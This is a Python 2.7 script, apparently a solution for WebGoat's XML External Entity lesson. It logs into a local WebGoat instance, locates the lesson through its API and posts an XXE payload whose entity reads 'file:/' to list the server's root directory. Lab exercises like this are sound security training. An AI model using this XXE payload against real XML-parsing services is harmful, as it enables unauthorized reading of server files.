#Python2.7
import requests
import argparse
import json
import re
import sys
# THIS ATTACK WILL WORK ONLY ONCE THEN WE HAVE TO RESET LESSON
def xml_external_entity():
	#start session
	session = requests.Session()
	#Webgoat login page get
	host = '127.0.0.1'
	port = '8082'
	webgoat_main_address = 'http://' + host + ':' + port + '/WebGoat/'
	webgoat_session = session.get( webgoat_main_address +'login.mvc' )
	lesson_name = "XML External Entity (XXE)"

	try:
		#session token store
		cookie = webgoat_session.cookies

		login_parameters = {'username': 'guest', 'password': 'guest'}
		#login to access content
		login = session.post( webgoat_main_address + 'j_spring_security_check;jsessionid=' + str( cookie['JSESSIONID'] ), login_parameters )

		#access all lessons json and finding lesson api address by lesson name 
		#we could use direct link to lesson but thats just different approach
		webgoat_lesson_api = session.get( webgoat_main_address + 'service/lessonmenu.mvc' )
		webgoat_lesson_api_split = webgoat_lesson_api.text.split( '},{' )

		for i in webgoat_lesson_api_split:
			if 'name\":\"' + lesson_name in i:
				lesson_api = i.split( "," )

		#prepare lesson address
		lesson_address = str( lesson_api[4].split( "\"" )[3] )
		lesson_parted_address = lesson_address[1:].split('/')
		lesson_prepared_api_address = lesson_parted_address[0] + '?Screen=' + lesson_parted_address[1] + '&menu=' + lesson_parted_address[2]

		#attack - post form
		input_data = "<?xml version=\"1.0\"?><searchForm><from>BOS</from></searchForm>"
		input_data_xxe_attack = "<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY name SYSTEM \"file:/\">]><searchForm><from>&name;</from></searchForm>"
		session.headers.update( {'Content-Type': 'text/xml'} )
		end_result =  session.post(  webgoat_main_address + lesson_prepared_api_address, input_data_xxe_attack )

		#validation only on docker
		if 'dockerenv' in end_result.text:
			print 'Success xxe vulnerability is still present'
			print 'the root list of the drive:'
			print json.loads(end_result.text)['searchCriteria']
		else:
			print 'Unfortunetaly it isn\'t working any more'
		
	except Exception as e:
		print e

xml_external_entity()